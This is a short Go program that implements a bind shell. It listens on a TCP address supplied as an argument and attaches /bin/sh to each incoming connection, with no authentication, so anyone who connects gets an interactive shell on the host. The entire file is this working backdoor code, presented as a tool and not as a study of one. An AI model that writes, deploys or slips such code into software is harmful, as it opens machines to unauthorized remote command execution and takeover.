package main 

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)
//shell to make use of 
var shell = "/bin/sh"

func main(){

	bind()
}

func bind(){
	if len(os.Args) != 2 {
		log.Fatal("you didn't provide an argument !")
		fmt.Println("example: " + os.Args[0] + " 1.1.1.1:9999")
		os.Exit(1)
	}

	//bind socket  
	listen , err := net.Listen("tcp", os.Args[1])
	if err != nil {
		log.Fatal("connection error ", err)
	}

	log.Println("listening for connections ")

	for {
		conn, err := listen.Accept()
		if err != nil{
			log.Fatal("error accepting connection ", err)
		}

		go handleConn(conn)
	}
}

// function to handle connection 
func handleConn(conn net.Conn){
	log.Printf("received connection from %s... Opening shell on %s",
				conn.RemoteAddr(), conn.RemoteAddr())
	conn.Write([]byte("connection established ... Opening shell..\n"))

	command := exec.Command(shell)
	command.Stdin = conn 
	command.Stdout = conn 
	command.Stderr = conn 
	command.Run()

	log.Printf("shell ended for %s", conn.RemoteAddr())
}